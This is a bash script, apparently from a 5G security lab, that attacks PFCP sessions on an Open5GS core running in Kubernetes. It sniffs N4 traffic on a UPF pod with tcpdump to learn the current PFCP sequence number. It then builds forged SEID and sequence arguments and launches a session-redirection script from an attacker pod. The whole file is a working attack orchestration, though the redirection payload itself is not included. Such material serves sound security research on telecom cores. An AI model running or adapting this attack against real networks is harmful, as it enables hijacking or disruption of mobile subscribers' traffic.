#!/bin/bash
if [ $# -eq 0 ]; then
    echo "Usage: $0 <seid1> <seid2> ..."
    exit 1
fi

SEIDS=("$@")
UPF2_POD=$(kubectl get pods -n open5gs-edge | grep upf2 | grep Running | awk '{print $1}')

echo "[*] UPF2 pod : $UPF2_POD"
echo "[*] Mini-capture SEQ (5s) sur UPF2..."

kubectl exec -n open5gs-edge "$UPF2_POD" -- \
    sh -c "rm -f /tmp/seq-sync.pcap; tcpdump -U -ni n4 udp port 8805 -c 10 -w /tmp/seq-sync.pcap; exit 0" 2>/dev/null

kubectl cp open5gs-edge/$UPF2_POD:/tmp/seq-sync.pcap /tmp/seq-sync.pcap 2>/dev/null

MAX_SEQ=$(python3 ~/attacks/pfcp/pfcp-extract-seids.py /tmp/seq-sync.pcap 2>/dev/null \
  | grep "SEQ max observe" \
  | awk '{print $5}')

if [ -z  "$MAX_SEQ" ] || [ "$MAX_SEQ" -eq 0 ]; then
    echo "[!] SEQ non trouve."
    exit 1
fi

echo "[+] SEQ courant SMF2 : $MAX_SEQ"

ARGS=""
for i in "${!SEIDS[@]}"; do
    ARGS="$ARGS ${SEIDS[$i]}:$((MAX_SEQ + 1 + i)):8805"
done

echo "[+] Arguments : $ARGS"
read -p "Appuie sur Entree pour lancer l'attaque immediatement..."

kubectl cp ~/attacks/pfcp/pfcp-redirection.py \
    pfcp-attacker:/root/pfcp-redirection.py -n open5gs-edge

kubectl exec -it pfcp-attacker -n open5gs-edge -- \
    python3 /root/pfcp-redirection.py $ARGS
